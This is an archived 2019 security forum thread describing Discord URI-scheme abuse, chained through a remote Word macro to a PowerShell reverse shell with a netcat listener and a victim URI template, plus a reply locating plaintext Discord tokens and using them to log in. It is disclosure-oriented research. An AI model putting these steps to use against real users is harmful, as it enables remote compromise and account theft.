---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-02-18_using-uri-to-pop-shells-via-the-discord-client.md
original_filename: 2019-02-18_using-uri-to-pop-shells-via-the-discord-client.md
title: Using URI to pop shells via the Discord Client
category: documents
detected_topics:
- sso
- access-control
- command-injection
- otp
- automation-abuse
- api-security
tags:
- imported
- documents
- sso
- access-control
- command-injection
- otp
- automation-abuse
- api-security
language: en
raw_sha256: 00504f02c2d8a31ce87e94fce846af756f32abcf56edcd94600f8f0d78cd4d0d
text_sha256: 9c429c5796ce57bcaf4eee4f60f7694d8d1a2d76246b781ee3f7e0e60466caa9
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Using URI to pop shells via the Discord Client

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-02-18_using-uri-to-pop-shells-via-the-discord-client.md
- Source Type: markdown
- Detected Topics: sso, access-control, command-injection, otp, automation-abuse, api-security
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `00504f02c2d8a31ce87e94fce846af756f32abcf56edcd94600f8f0d78cd4d0d`
- Text SHA256: `9c429c5796ce57bcaf4eee4f60f7694d8d1a2d76246b781ee3f7e0e60466caa9`


## Content

---
title: "Using URI to pop shells via the Discord Client"
page_title: "Using URI to pop shells via the Discord Client - Exploit Development - 0x00sec - The Home of the Hacker"
url: "https://0x00sec.org/t/using-uri-to-pop-shells-via-the-discord-client/11673"
final_url: "https://archive.0x00sec.org/t/using-uri-to-pop-shells-via-the-discord-client/11673"
authors: ["RagSec (@rag_sec)"]
programs: ["Discord"]
bugs: ["URI abuse", "Social engineering"]
publication_date: "2019-02-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5402
---

#  [Using URI to pop shells via the Discord Client](11673.html)

[ Exploit Development ](../../c/exploit-development/53.html)

[hacking](../../tag/hacking.html)

[RagSec](../../u/RagSec.html) (RagSec)  February 18, 2019, 4:27pm  1

![](../../../0x00sec.s3.amazonaws.com/original/2X/0/00d493679a22eaab33a03bd4ac8e66b24a6ddfdb.png)

**Introduction**

Myself and a fellow researcher: Styx were the leads on this research and we were backed up by [CyberSecStu](../../../external.html?link=https://www.twitter.com/cybersecstu), and [5w0rdFish](../../../external.html?link=https://www.twitter.com/5w0rdFish) from [The Many Hats Club](../../../external.html?link=https://themanyhats.club/). We discovered a vulnerability within the Discord client that enabled an attacker to call local programs on a target system. We then took this flaw and used it to pivot through MS-Word macros to start a reverse TCP shell automatically from the discord client.

**Understanding**

What is Uniform Resource Identifier (URI)?  
A Uniform Resource Identifier (URI) is a string of characters that unambiguously identifies a particular resource. To guarantee uniformity, all URIs follow a predefined set of syntax rules, but also maintain extensibility through a separately defined hierarchical naming scheme (e.g. “http://”).

We were informed by a third party that the discord client will accept URI schemes as links if you put it in <>

For more information check out Shay’s work on different methods of URI abuse in Discord [here](../../../external.html?link=https://drive.google.com/file/d/1SCTj4WZo8VlitrAazPCueGz3Gg60jG5d/view)

So when Discord is passed a URI like below

_<[URI Scheme]://[Random Input]>_

It would enable us to call local applications. For example:

_calculator://a_

This would be interpreted by Discord as a link and when clicked would cause the calculator application to execute and open on the local machine.

Styx and I then began researching into URIs and the types of requests we could make. This leads us to the [IANA URI Schemes](../../../external.html?link=https://www.iana.org/assignments/uri-schemes/uri-schemes.xhtml). From there we began enumerating which of the URI’s we could execute and which fail.

![](../../../0x00sec.s3.amazonaws.com/original/2X/8/8beb5978b8abf632343cfadaf96fdd9df6dada3a.png)

An example of the URI testing

If the URI was requesting something that wasn’t installed on the host system it would display the below message. For example:

_afp://a_

![](../../../0x00sec.s3.amazonaws.com/original/2X/7/7d0fcf866039e77153a9cc824da4e960a0701dc4.png)

Failed to call AFP

We soon discovered that you could make all sorts of local programs open. Some of the most interesting being: all of the ms-office applications _ms-word://a_ , basic windows applications eg. Calculator _calculator://a_ or Mail _mailto://a_ , browsers using FTP _FTP://127.0.0.1_ or Chrome using _chrome://a_ among many others.

Something we found that was interesting was the ability to open windows media player and have it stream audio from the internet using where it would again just automatically open and connect without prompting the victim.

While enumerating the inputs for the URI links we discovered that it accepted UTF-8 encoded text so knowing this we could specific arguments and URLs after the service indicator.

**Exploitation**

As discussed above we are able to call Microsoft Office programs. So we began looking further into this and it gives us the ability to automatically open remote files using _< ms-word://[file location]>_. So this means we can run potentially infected files with VBA macros.  
So we took this idea and attempted to test it.

Step 1, Use [SET](../../../external.html?link=https://www.trustedsec.com/social-engineer-toolkit-set/) to generate a Powershell Reverse Shell

![](../../../0x00sec.s3.amazonaws.com/original/2X/0/07b8e32becf62e193be502c3245137042b78aae1.png)

Use Option 1 – Social-Engineering Attacks

![](../../../0x00sec.s3.amazonaws.com/original/2X/a/af4d0634b14ba2799b2861bbce34fc3176709dbb.png)

Use Option 9 – Powershell Attack Vector

![](../../../0x00sec.s3.amazonaws.com/original/2X/0/03ca56d042c0fb5184e4163bfaa6afd53d6de0f7.png)

Use Option 2 – Powershell Reverse Shell

![](../../../0x00sec.s3.amazonaws.com/original/2X/e/e4b1292f3f8493509c2cfc4037438975a84707fd.png)

Type in your IP Address

![](../../../0x00sec.s3.amazonaws.com/original/2X/e/ebf7e5c23afa2c5f27e5babc1d915056784b872a.png)

Specify a port for the shell to use

![](../../../0x00sec.s3.amazonaws.com/original/2X/e/e52fb391bf9a7a0a4d8aa68a1b922dbf9c609cfa.png)

You can choose to start a lister or not

Step 2, Upload the generated payload  
Using whatever service you want put the payload file on the internet so the macro which you can create later.

Step 3, Create the VBA Macro in the word document (.docm, .dotm)

![](../../../0x00sec.s3.amazonaws.com/original/2X/b/b975282c6ed2e9b31dcd7f63a6e17823079e4b60.png)

Here is an example of the macro

Step 4, Upload the word file  
Save the file and upload it to the same place as a the payload so it can also be called remotely  
Step 5, Start listener if you haven’t already

![](../../../0x00sec.s3.amazonaws.com/original/2X/a/adc05f2abe1d7cddfc7052658ae7e7f74dd5f66d.png)

Using netcat create a lister on port 4444 or whatever port you specified in SET

Step 6, Send victim URI  
_< ms-word:nft%7Cu%7C[LOCATION OF WORD FILE]%7Cs%7Chttp://[LOCATION OF WORD FILE]>_

_< ms-word:nft|u|[LOCATION OF WORD FILE]|s|[LOCATION OF WORD FILE]>_

For more information regarding the ms-word URI goto [this link](../../../external.html?link=https://docs.microsoft.com/en-us/office/client-developer/office-uri-schemes)

Step 7, GG Shell Popped! 1337 af

**Disclosure**

Once we had a functional PoC it was time to contact discord. We did so via Twitter and their Bug Bounty Disclosure page on their website. Following Correspondance, with Discord’s security team they discussed that the URI filtering issue wasn’t in the scope of their bug bounty scheme as it apparently classed under “Social Engineering”. However, they have pushed forward to dealing with the issue and elevating the patching action internally.

_“However, given, this is the intended behaviour of how custom protocols work on computers in general, we don’t consider this a security vulnerability – and at best a social engineering attack, which is, unfortunately not covered by our bug-bounty” – Discord’s Security Team_

**Conclusion**

In conclusion, the URI validation in the Discord Client is insufficient it should not be able to call local programs nor does it require that functionality. It just leaves discord users vulnerable to attack. All it would take is one really well-crafted piece of malware to be executed by one of the many accepted URIs and a victims machine can be directly affected. While the reverse shell or other functionality does not come directly from the discord client the client enables the attacker the ability to pivot through itself and affect the victims’ machine directly. Discord can likely solve this issue by implementing some degree of input validation when it comes to URI scheme, eg. filter all but HTTP and https as these are the only ones that make practical sense to a typical user to have access to.

26 Likes

[Baud](../../u/Baud.html) February 19, 2019, 11:16pm  2

Thank you for sharing this good finding, if they didn’t want to remove the functionality altogether they could have at least implemented a warning prompt to ask the user if they really want to call an external application to open the URI, much like web browsers do, but whatever, it’s their call.

I just want to give my two cents by demonstrating how it is possible to exploit this attack vector to gain control of the actual Discord account, to give the scenario a more realistic goal and to emphatize how Discord’s login system isn’t so secure after all, as it relies a bit too much on trust.

Like many programs that rely on user accounts, Discord saves our information somewhere to allow us to login automatically without the need of asking for credentials every time. It’s handy, sure, but when done _this_ way it’s actually dangerous. Why? Well, because Discord doesn’t really save our credentials locally, and that’s good, but instead, it saves a long string that is associated with our account and uses this string to authenticate with its own servers. This string is called “token” and is like a hidden key to a user account, because if you’re in possess of a user’s token you won’t need any email, any username, let alone a password, to log in as that user.

This is how the Discord client authenticates itself to its server, by adding an Authorization header in an HTTPS request where the value of said header is our personal token, then a cookie is used to validate the session, while no email or password is being sent to the server, so this means that the server will trust us as long as we have a valid token, and nothing else:

![Discord_token_Burp](../../../0x00sec.s3.amazonaws.com/original/2X/e/ee916017da1f590523c68c48df54018db510dde4.png)

Tokens are typically used for bots, but every user has its own as well, and even if the official client won’t let us login with a simple token there are ways to bypass this limitation, we are going to see one later.

Discord has always known that these tokens aren’t exactly safe, in fact, until only a few months ago they could be obtained by manipulating users into opening the developer tools window and sending the string directly to the attackers, because it could be seen from the Application tab, and used to be stored in a database file called _https_discordapp.com_0.localstorage_ sitting in _“%appdata%\discord\local storage”_ , inside a very obvious “token” key.

But this has changed, because that database is no longer there and the token can’t be seen from the developer tools anymore, meaning they probably realized this system is a little dangerous? No, not really. They just moved it. This time tokens are saved in a different file, always in the same Local Storage folder. This new file seems to have different names depending on the OS Discord is running on, it’s called 000005.ldb on Windows 10, just 000003 on Windows 7, and 000003.log on Debian. For Windows, the full path is (N and .ext depend on the OS):
  
  
  %APPDATA%/discord/Local Storage/leveldb/00000N.ext
  

For Linux (tested on latest stable Debian):
  
  
  ~/.config/discord/Local Storage/leveldb/000003.log
  

And this is how they look like, with tokens being “hidden in plain sight”, completely in plain text but covered in red because I don’t want my test accounts stolen:

![Discord_token_1](../../../0x00sec.s3.amazonaws.com/original/2X/7/7a9f1454755ecddd0f821bd95e045a79babb115c.png)

![Discord_token_2](../../../0x00sec.s3.amazonaws.com/original/2X/2/2f9ebdca848a3266f2074b07352e4900e7e9bb91.png)

These files can be opened with no issue while Discord is running using the same OS account the program is running on, which should be the same account that gave you local access in the first place anyway.

If you have obtained a user token it is now possible to log into that account using a third party client like [Discurses](../../../external.html?link=https://github.com/topisani/Discurses), which is a nice CLI third party client for Linux. Once installed (be careful: it only works with Python 3.6) you can create the file _~/.config/discurses.yaml_ and paste this in it:
  
  
  ---
  token: INSERT_TOKEN_HERE
  # Set this to True or False for notifications
  notify: True
  

Launch Discurses, and enjoy:

![Discord_Discurses](../../../0x00sec.s3.amazonaws.com/original/2X/c/cf2f1d1de1aa8ac877fcc32bf92a79a2329caef4.png)

All this to say one simple thing: Discord may not see this as a big security issue, but it definitely puts users at risk when coupled with a poor authentication scheme like this.

8 Likes

[Joe_Schmoe](../../u/Joe_Schmoe.html) February 20, 2019, 2:32pm  3

Does this work only on Windows 10? It worked for my friend but on my computer clicking the links does nothing.

[RagSec](../../u/RagSec.html) (RagSec)  February 20, 2019, 5:17pm  4

Hi,

Yeah we only got this working on Windows 10, there are other URI Schemes you can use on MacOS but we didnt get anywhere with running it on Linux.

Hope This Helps <3

1 Like

[stromy](../../u/stromy.html) February 20, 2019, 9:37pm  5

So that’s why 0x00sec is moving to discord… Interesting ![:slight_smile:](../../../0x00sec.org/images/emoji/twitter/slight_smilec164.html?v=9)

Great post man!

2 Likes

[lkw](../../u/lkw.html) February 22, 2019, 10:35am  6

![](../../user_avatar/d.clarkee.co.uk/baud/48/5512_2.png) Baud:

> Discord has always known that these tokens aren’t exactly safe, in fact, until only a few months ago they could be obtained by manipulating users into opening the developer tools window and sending the string directly to the attackers,

I’m not quite sure what your issue is, if I understand your post correctly isn’t every site like that?

[Baud](../../u/Baud.html) February 22, 2019, 11:52am  7

That’s why I don’t have an issue with discord for being potential targets of social engineers, what I was pointing out is that instead of making the abused mechanic safer they just hid a value to make it harder to find, and not by a lot. I think that if you’re planning to store a user’s authentication details permanently you should at the very least encrypt them, and that’s not what they did.

[lkw](../../u/lkw.html) February 22, 2019, 12:01pm  8

I don’t see how encryption can solve this problem without making a user enter a password or other authentication mechanism which it is tying to avoid.

[Baud](../../u/Baud.html) February 22, 2019, 1:17pm  9

In fact I don’t think this token mechanism is smart in the first place, they sacrificed security for a simpler system. It’s the only popular application that I know of that relies on something like this.

[lkw](../../u/lkw.html) February 22, 2019, 1:28pm  10

I think I’ve misunderstood. How is Discord different to a normal cookie/token based login?

[Baud](../../u/Baud.html) February 22, 2019, 1:38pm  11

Cookies are only valid for a certain period of time after which they can no longer be used and can be tied to other values that you need in order to fully validate a session, or the server could refuse the connection even if the cookie is valid.  
These tokens are only changed when you change the password of your account, otherwise they are permanent and don’t require you to know anything about the account it belongs to in order to use it. The token is obtained only once and then saved locally for automatic login, cookies are given by the server at the beginning of every session. Maybe it’s a system others use as well and I’m new to it, but I haven’t heard of other messaging apps that use it.

[lkw](../../u/lkw.html) February 22, 2019, 1:50pm  12

Okay, I agree that sounds bad.

1 Like

[Rot127](../../u/Rot127.html) (Guess, there's a solution I'm not seeing.)  February 25, 2019, 9:02pm  13

Thanks for the nice read.  
Seems to be a perfect example of “It’s not a bug, it’s a feature!” ![:stuck_out_tongue:](../../../0x00sec.org/images/emoji/twitter/stuck_out_tonguec164.html?v=9)

[system](../../u/system.html) (system) Closed  March 20, 2019, 4:28pm  14

This topic was automatically closed after 30 days. New replies are no longer allowed.
